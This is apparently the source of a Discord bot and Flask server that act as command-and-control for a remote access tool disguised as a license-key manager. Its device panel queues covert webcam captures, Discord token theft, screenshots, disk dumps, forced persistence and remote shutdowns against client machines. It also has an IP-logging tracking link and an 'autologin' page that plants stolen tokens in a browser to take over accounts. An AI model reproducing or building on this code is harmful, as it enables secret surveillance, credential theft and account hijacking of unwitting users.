import os
import base64
import json
import random
import string
import time
import asyncio
import discord
from discord import app_commands
import requests
from flask import Flask, request, render_template_string
from threading import Thread

app = Flask('')

HOST_URL = "https://threesrh-system-data.onrender.com"

@app.route('/')
def home():
    return "3SRH Manager Bot is alive and running!"

@app.route('/autologin')
def autologin():
    sid = request.args.get('sid')
    if not sid: return "❌ Invalid Session ID", 400
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
        headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            file_data = r.json()
            db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
            sessions = db.get("web_sessions", {})
            if sid in sessions:
                session_data = sessions[sid]
                credential = session_data.get("credential")
                html_page = f"""
                <html>
                <head><title>3SRH Auto Login</title></head>
                <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
                    <h2>🔄 جاري تسجيل الدخول تلقائياً...</h2>
                    <script>
                        setTimeout(function() {{
                            localStorage.setItem('token', JSON.stringify("{credential}"));
                            window.location.href = 'https://discord.com/app';
                        }}, 1000);
                    </script>
                </body>
                </html>
                """
                return html_page
    except Exception:
        pass
    return "❌ Session expired or not found", 404

@app.route('/track')
def track_visitor():
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        ip = request.remote_addr
        
    user_agent = request.headers.get('User-Agent', 'Unknown')
    cam = request.args.get('cam', 'false')
    fs_exploit = request.args.get('fs', 'false')
    redirect_target = request.args.get('to', 'https://www.google.com')
    
    country, city, isp = 'Unknown', 'Unknown', 'Unknown'
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3).json()
        if geo_res.get('status') == 'success':
            country = geo_res.get('country', 'Unknown')
            city = geo_res.get('city', 'Unknown')
            isp = geo_res.get('isp', 'Unknown')
    except Exception:
        pass

    visit_data = {"ip": ip, "country": country, "city": city, "isp": isp, "user_agent": user_agent, "time": int(time.time())}
    try:
        db, sha, url, headers = fetch_db()
        if db:
            if "web_visits" not in db: db["web_visits"] = []
            db["web_visits"].append(visit_data)
            save_db(db, sha, url, headers, f"New visit from IP {ip}")
    except Exception:
        pass

    page_template = """
    <html>
    <head><title>Loading...</title></head>
    <body style="background:#111; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
        <h3 id="st">جاري تحميل المحتوى، يرجى الانتظار...</h3>
        <script>
            setTimeout(() => { window.location.href = "{{ target }}"; }, 1500);
        </script>
    </body>
    </html>
    """
    return render_template_string(page_template, target=redirect_target)

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

TOKEN = os.getenv('TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
REPO_OWNER = os.getenv('REPO_OWNER', 'kqi5q')
REPO_NAME = os.getenv('REPO_NAME', '3srh-system-data')
FILE_PATH = os.getenv('FILE_PATH', 'licenses.json')
CHANNEL_ID = int(os.getenv('CHANNEL_ID', 1547705815698382970))

class LicenseBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()
        print("Slash commands synced successfully!")

    async def on_ready(self):
        print(f"Logged in as {self.user} (ID: {self.user.id})")
        print("Bot is online and ready!")

    async def on_interaction(self, interaction: discord.Interaction):
        if interaction.type == discord.InteractionType.component:
            custom_id = interaction.data.get("custom_id", "")
            prefixes = ("ban_", "unban_", "recycle_", "kick_")
            if custom_id.startswith(prefixes):
                if not interaction.response.is_done():
                    await interaction.response.defer(thinking=True, ephemeral=True)
                try:
                    action, encoded_data = custom_id.split("_", 1)
                    padding = "=" * (-len(encoded_data) % 4)
                    decoded_bytes = base64.urlsafe_b64decode(encoded_data + padding)
                    raw_data = decoded_bytes.decode("utf-8")
                    user_code, current_device = raw_data.split(":", 1)
                except Exception:
                    await interaction.followup.send("❌ فشل تحليل بيانات الزر.", ephemeral=True)
                    return

                db, sha, url, headers = fetch_db()
                if not db:
                    await interaction.followup.send("❌ فشل الاتصال بغيت هب.", ephemeral=True)
                    return

                if action == "ban":
                    if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
                    if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
                    if user_code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(user_code)
                    if current_device and current_device not in db["blacklisted_devices"]: db["blacklisted_devices"].append(current_device)
                    if user_code in db.get("codes", {}):
                        db["codes"][user_code]["used"] = False
                        db["codes"][user_code]["device"] = None
                    if save_db(db, sha, url, headers, f"Ban code {user_code} via button"):
                        await interaction.followup.send(f"🚫 تم حظر الكود `{user_code}` والجهاز بنجاح!", ephemeral=True)

                elif action == "unban" or action == "recycle":
                    if user_code in db.get("blacklisted_codes", []): db["blacklisted_codes"].remove(user_code)
                    if current_device in db.get("blacklisted_devices", []): db["blacklisted_devices"].remove(current_device)
                    if user_code in db.get("codes", {}):
                        db["codes"][user_code]["used"] = False
                        db["codes"][user_code]["device"] = None
                    if save_db(db, sha, url, headers, f"Reset code {user_code} via button"):
                        await interaction.followup.send(f"♻️ تم إلغاء الحظر وتصفير الكود `{user_code}`!", ephemeral=True)

                elif action == "kick":
                    if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
                    db["targeted_kick_messages"][user_code] = {"msg": "تم طردك من المشرف", "id": str(int(time.time()))}
                    if save_db(db, sha, url, headers, f"Kick code {user_code} via button"):
                        await interaction.followup.send(f"👢 تم إرسال أمر الطرد للعميل `{user_code}`!", ephemeral=True)

client = LicenseBot()

def generate_random_code():
    chars = string.ascii_uppercase + string.digits
    part = ''.join(random.choices(chars, k=5))
    return f"3SRH-{part}"

def fetch_db():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers, timeout=5)
    if r.status_code == 200:
        file_data = r.json()
        db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
        return db, file_data["sha"], url, headers
    return None, None, url, headers

def save_db(db, sha, url, headers, commit_message):
    new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
    update_data = {"message": commit_message, "content": new_content, "sha": sha}
    r = requests.put(url, headers=headers, json=update_data, timeout=5)
    return r.status_code in [200, 201]

class ConfirmSaveView(discord.ui.View):
    def __init__(self, generated_codes, count):
        super().__init__(timeout=60)
        self.generated_codes = generated_codes
        self.count = count

    @discord.ui.button(label="نعم، حفظ الأكواد", style=discord.ButtonStyle.green, custom_id="save_codes_yes")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بغيت هب.", ephemeral=True)
            return
        if "codes" not in db: db["codes"] = {}
        for code in self.generated_codes:
            db["codes"][code] = {"used": False, "device": None, "ip": None, "port": None, "country": None}
        if save_db(db, sha, url, headers, f"Generated {self.count} new codes"):
            codes_str = "\n".join([f"`{c}`" for c in self.generated_codes])
            try: await interaction.message.delete()
            except Exception: pass
            await interaction.followup.send(f"✅ **تم حفظ {self.count} كود:**\n\n{codes_str}", ephemeral=True)

    @discord.ui.button(label="لا، إلغاء", style=discord.ButtonStyle.red, custom_id="save_codes_no")
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        try: await interaction.message.delete()
        except Exception: pass
        await interaction.followup.send("❌ تم إلغاء العملية.", ephemeral=True)

class UnusedManagementView(discord.ui.View):
    def __init__(self, unused_codes):
        super().__init__(timeout=180)
        for code in unused_codes[:25]:
            self.add_item(DeleteUnusedCodeButton(code))

class DeleteUnusedCodeButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label=f"🗑️ حذف: {code}", style=discord.ButtonStyle.danger, custom_id=f"del_Unused_{code}")
        self.code = code

    async def callback(self, interaction: discord.Interaction):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if self.code in db.get("codes", {}):
            del db["codes"][self.code]
            if save_db(db, sha, url, headers, f"Delete unused {self.code}"):
                await interaction.followup.send(f"🗑️ تم حذف الكود `{self.code}` نهائياً!", ephemeral=True)

class BlacklistedCodesView(discord.ui.View):
    def __init__(self, blacklisted_codes):
        super().__init__(timeout=180)
        for code in blacklisted_codes[:25]:
            self.add_item(UnbanCodeButton(code))

class UnbanCodeButton(discord.ui.Button):
    def __init__(self, code):
        super().__init__(label=f"♻️ رفع الحظر عن: {code}", style=discord.ButtonStyle.success, custom_id=f"unban_code_{code}")
        self.code = code

    async def callback(self, interaction: discord.Interaction):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if self.code in db.get("blacklisted_codes", []):
            db["blacklisted_codes"].remove(self.code)
            if self.code in db.get("codes", {}):
                db["codes"][self.code]["used"] = False
                db["codes"][self.code]["device"] = None
            if save_db(db, sha, url, headers, f"Unban code {self.code}"):
                await interaction.followup.send(f"♻️ تم رفع الحظر عن الكود `{self.code}` بنجاح!", ephemeral=True)

class DeviceActionsView(discord.ui.View):
    def __init__(self, code, hwid, ip, port, country):
        super().__init__(timeout=60)
        self.code = code
        self.hwid = hwid
        self.ip = ip
        self.port = port
        self.country = country

    @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
    async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
            if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
            if self.code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(self.code)
            if self.hwid and self.hwid not in db["blacklisted_devices"]: db["blacklisted_devices"].append(self.hwid)
            db["codes"][self.code]["used"] = False
            db["codes"][self.code]["device"] = None
            if save_db(db, sha, url, headers, f"Ban HWID {self.hwid}"):
                await interaction.followup.send(f"🚫 تم حظر الكود والهاردوير بنجاح!", ephemeral=True)

    @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
    async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
            db["targeted_kick_messages"][self.code] = {"msg": "تم طردك من المالك", "id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Kick {self.ip}"):
                await interaction.followup.send(f"👢 تم إرسال أمر الطرد للعميل!", ephemeral=True)

    @discord.ui.button(label="📸 التقاط كاميرا سرية", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=1)
    async def webcam_snapshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_webcams" not in db: db["remote_webcams"] = {}
            db["remote_webcams"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Request webcam for {self.code}"):
                await interaction.followup.send("📸 تم طلب التقاط صورة الكاميرا السرية!", ephemeral=True)

    @discord.ui.button(label="🔑 سحب توكنات ديسكورد", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=1)
    async def tokens_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_token_stealers" not in db: db["remote_token_stealers"] = {}
            db["remote_token_stealers"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Steal tokens for {self.code}"):
                await interaction.followup.send("🔑 تم إرسال أمر سحب توكنات ديسكورد للعميل!", ephemeral=True)

    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=1)
    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_screenshots" not in db: db["remote_screenshots"] = {}
            db["remote_screenshots"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Screenshot {self.code}"):
                await interaction.followup.send("📸 تم إرسال أمر التقاط الشاشة!", ephemeral=True)

    @discord.ui.button(label="📂 سحب الملفات (Disk Dump)", style=discord.ButtonStyle.secondary, custom_id="dev_act_diskdump", row=1)
    async def diskdump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_disk_dumps" not in db: db["remote_disk_dumps"] = {}
            db["remote_disk_dumps"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Disk dump for {self.code}"):
                await interaction.followup.send("📂 تم إرسال أمر سحب الملفات للعميل!", ephemeral=True)

    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=2)
    async def lock_app_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_lock_states" not in db: db["remote_lock_states"] = {}
            db["remote_lock_states"][self.code] = {"locked": True, "id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Lock closure {self.code}"):
                await interaction.followup.send("🛡️ تم تفعيل الثبات الإلزامي للعميل!", ephemeral=True)

    @discord.ui.button(label="🔓 إلغاء الثبات (إغلاق عادي)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=2)
    async def unlock_app_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_lock_states" in db and self.code in db["remote_lock_states"]:
                del db["remote_lock_states"][self.code]
            if save_db(db, sha, url, headers, f"Unlock closure {self.code}"):
                await interaction.followup.send("🔓 تم إلغاء الثبات وأصبح بإمكانه الإغلاق العادي.", ephemeral=True)

    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
    async def kill_persistent_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_force_close" not in db: db["remote_force_close"] = {}
            db["remote_force_close"][self.code] = {"id": str(int(time.time()))}
            if "remote_lock_states" in db and self.code in db["remote_lock_states"]:
                del db["remote_lock_states"][self.code]
            if save_db(db, sha, url, headers, f"Force close app for {self.code}"):
                await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة بالكامل من الخلفية (دون حذف ملفاتها من جهازه)!", ephemeral=True)

    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=3)
    async def shutdown_pc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_shutdowns" not in db: db["remote_shutdowns"] = {}
            db["remote_shutdowns"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Shutdown PC for {self.code}"):
                await interaction.followup.send("⚡ **تم إرسال أمر إيقاف تشغيل الجهاز (Shutdown) للعميل بنجاح!**", ephemeral=True)

class DevicesSubMenuView(discord.ui.View):
    def __init__(self, devices_list):
        super().__init__(timeout=180)
        for code, info in devices_list[:25]:
            self.add_item(DeviceManageButton(code, info))

class DeviceManageButton(discord.ui.Button):
    def __init__(self, code, info):
        ip = info.get("ip", "Unknown")
        port = info.get("port", "7680")
        country = info.get("country", "Unknown")
        super().__init__(label=f"🌐 {ip} | {country} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
        self.code = code
        self.info = info

    async def callback(self, interaction: discord.Interaction):
        ip = self.info.get('ip', 'Unknown')
        port = self.info.get('port', '7680')
        country = self.info.get('country', 'Unknown')
        view = DeviceActionsView(self.code, self.info.get("device"), ip, port, country)
        if not interaction.response.is_done():
            await interaction.response.send_message(
                f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP: `{ip}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{self.info.get('device')}`", 
                view=view, ephemeral=True
            )

class MainDashboardView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="📁 إدارة الأكواد المتاحة", style=discord.ButtonStyle.primary, custom_id="dash_main_unused", row=0)
    async def unused_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
        if not unused_list:
            await interaction.followup.send("🟢 لا توجد أكواد غير مستخدمة حالياً.", ephemeral=True)
            return
        view = UnusedManagementView(unused_list)
        await interaction.followup.send(f"🟢 **الأكواد المتاحة (اختر للحذف):**\n📊 العدد: `{len(unused_list)}`", view=view, ephemeral=True)

    @discord.ui.button(label="🚫 إدارة الأكواد المحظورة", style=discord.ButtonStyle.danger, custom_id="dash_main_blacklist", row=0)
    async def blacklist_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        blacklisted = db.get("blacklisted_codes", [])
        if not blacklisted:
            await interaction.followup.send("🟢 لا توجد أي أكواد محظورة حالياً.", ephemeral=True)
            return
        view = BlacklistedCodesView(blacklisted)
        await interaction.followup.send(f"🚫 **الأكواد المحظورة (اضغط لرفع الحظر):**\n📊 العدد: `{len(blacklisted)}`", view=view, ephemeral=True)

    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=1)
    async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db:
            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
            return
        devices_list = [(code, info) for code, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
        if not devices_list:
            await interaction.followup.send("🟢 لا توجد أي أجهزة متصلة حالياً.", ephemeral=True)
            return
        view = DevicesSubMenuView(devices_list)
        await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)

# ==========================================
# الأوامر الأساسية الشاملة (Slash Commands)
# ==========================================

@client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
@app_commands.describe(count="عدد الأكواد (من 1 إلى 20)")
async def generate_codes(interaction: discord.Interaction, count: int = 1):
    if count < 1 or count > 20:
        await interaction.response.send_message("❌ يمكنك توليد ما بين 1 إلى 20 كوداً فقط.", ephemeral=True)
        return
    new_codes = [generate_random_code() for _ in range(count)]
    codes_str = "\n".join([f"`{c}`" for c in new_codes])
    await interaction.response.send_message(f"⚠️ **حفظ الأكواد التالية؟**\n\n{codes_str}", view=ConfirmSaveView(new_codes, count), ephemeral=True)

@client.tree.command(name="loginbytoken", description="توليد رابط دخول سريع عبر المتصفح باستخدام التوكن أو الكوكيز")
@app_commands.describe(platform="اختر المنصة", token_or_cookie="ضع التوكن أو الكوكيز هنا")
@app_commands.choices(platform=[
    app_commands.Choice(name="Discord", value="discord"),
    app_commands.Choice(name="Epic Games", value="epic"),
    app_commands.Choice(name="Steam", value="steam"),
    app_commands.Choice(name="Other Web", value="other")
])
async def loginbytoken_command(interaction: discord.Interaction, platform: str, token_or_cookie: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    db, sha, url, headers = fetch_db()
    if db:
        if "web_sessions" not in db: db["web_sessions"] = {}
        db["web_sessions"][session_id] = {"platform": platform, "credential": token_or_cookie.strip(), "time": int(time.time())}
        save_db(db, sha, url, headers, f"Create web session {session_id}")
    web_link = f"{HOST_URL}/autologin?sid={session_id}"
    embed = discord.Embed(title="🌐 رابط الدخول السريع للجلسة", description=f"منصة: **{platform.upper()}**\n\n[اضغط لفتح صفحة الدخول]({web_link})", color=0x00FF00)
    await interaction.followup.send(embed=embed, ephemeral=True)

@client.tree.command(name="link", description="توليد رابط تتبع مع خيارات الكاميرا والوصول للملفات")
@app_commands.describe(redirect_to="رابط الوجهة النهائية", capture_cam="طلب إذن الكاميرا؟", file_system="تفعيل الوصول للملفات")
@app_commands.choices(capture_cam=[app_commands.Choice(name="نعم", value="true"), app_commands.Choice(name="لا", value="false")],
                    file_system=[app_commands.Choice(name="تفعيل", value="true"), app_commands.Choice(name="إيقاف", value="false")])
async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com", capture_cam: str = "false", file_system: str = "false"):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}&cam={capture_cam}&fs={file_system}"
    embed = discord.Embed(title="🔗 رابط التتبع المطور جاهز", description=f"`{track_url}`", color=0xFF5733)
    await interaction.followup.send(embed=embed, ephemeral=True)

@client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
async def unused_command(interaction: discord.Interaction):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db: return
    unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
    if not unused_list:
        await interaction.followup.send("🟢 لا توجد أكواد غير مستخدمة.", ephemeral=True)
        return
    view = UnusedManagementView(unused_list)
    await interaction.followup.send(f"🟢 **الأكواد المتاحة (اختر للحذف):**\n📊 العدد: `{len(unused_list)}`", view=view, ephemeral=True)

@client.tree.command(name="clearused", description="حذف جميع الأكواد المستخدمة دفعة واحدة")
async def clear_used_codes(interaction: discord.Interaction):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db or "codes" not in db: return
    old_count = len(db["codes"])
    db["codes"] = {c: info for c, info in db["codes"].items() if not info.get("used", False)}
    removed = old_count - len(db["codes"])
    if save_db(db, sha, url, headers, f"Cleared {removed} used codes"):
        await interaction.followup.send(f"🧹 تم حذف `{removed}` كود مستخدم!", ephemeral=True)

@client.tree.command(name="check", description="التحقق من حالة كود معين ومعرفة تفاصيله")
@app_commands.describe(code="الكود المراد فحصه")
async def check_code(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    info = db["codes"][code]
    status = "مستخدم 🔴" if info.get("used") else "متاح 🟢"
    await interaction.followup.send(f"🔍 **الكود `{code}`:**\n📌 الحالة: {status}\n🌐 IP: `{info.get('ip') or 'غير متصل'}`\n🌍 الدولة: `{info.get('country') or 'غير معروفة'}`\n🔒 HWID: `{info.get('device') or 'لا يوجد'}`", ephemeral=True)

@client.tree.command(name="delete", description="حذف كود نهائياً")
@app_commands.describe(code="الكود المراد حذفه")
async def delete_code(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    del db["codes"][code]
    if save_db(db, sha, url, headers, f"Delete code: {code}"):
        await interaction.followup.send(f"🗑️ تم حذف الكود `{code}` نهائياً!", ephemeral=True)

@client.tree.command(name="resetdevice", description="تصفير ارتباط الكود وإرجاعه متاحاً")
@app_commands.describe(code="الكود المراد تصفيره")
async def reset_device(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    db["codes"][code]["used"] = False
    db["codes"][code]["device"] = None
    db["codes"][code]["ip"] = None
    if save_db(db, sha, url, headers, f"Reset code: {code}"):
        await interaction.followup.send(f"🔄 تم تصفير الكود `{code}` وأصبح متاحاً!", ephemeral=True)

@client.tree.command(name="screenshot", description="التقاط لقطة شاشة لجهاز عميل معين")
@app_commands.describe(target="اسم الجهاز أو كود التفعيل المستهدف")
async def screenshot_command(interaction: discord.Interaction, target: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = fetch_db()
    if not db: return
    target_upper = target.strip().upper()
    if target_upper not in db.get("codes", {}):
        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target}`", ephemeral=True)
        return
    if "remote_screenshots" not in db: db["remote_screenshots"] = {}
    db["remote_screenshots"][target_upper] = {"id": str(int(time.time()))}
    if save_db(db, sha, url, headers, f"Request screenshot for {target_upper}"):
        await interaction.followup.send(f"📸 **تم إرسال أمر التقاط الشاشة بنجاح!**", ephemeral=True)

@client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
@app_commands.describe(amount="عدد الرسائل المراد مسحها")
async def clear_messages(interaction: discord.Interaction, amount: int = 10):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🧹 تم تنظيف وحذف `{len(deleted)}` رسالة!", ephemeral=True)
    await asyncio.sleep(3)
    try: await interaction.delete_original_response()
    except Exception: pass

@client.tree.command(name="sync", description="مزامنة الأوامر")
async def sync_commands(interaction: discord.Interaction):
    await client.tree.sync()
    if not interaction.response.is_done():
        await interaction.response.send_message("✅ تم مزامنة الأوامر بنجاح!", ephemeral=True)

@client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
async def stats_gui_command(interaction: discord.Interaction):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = fetch_db()
    if not db: return
    codes = db.get("codes", {})
    total = len(codes)
    used = sum(1 for c in codes.values() if c.get("used"))
    available = total - used
    blacklisted = len(db.get("blacklisted_codes", []))
    embed = discord.Embed(title="📊 لوحة التحكم والإحصائيات الشاملة", color=0xA871FF)
    embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
    embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
    embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
    embed.add_field(name="🚫 المحظورة", value=f"`{blacklisted}`", inline=True)
    await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)

if TOKEN:
    client.run(TOKEN)
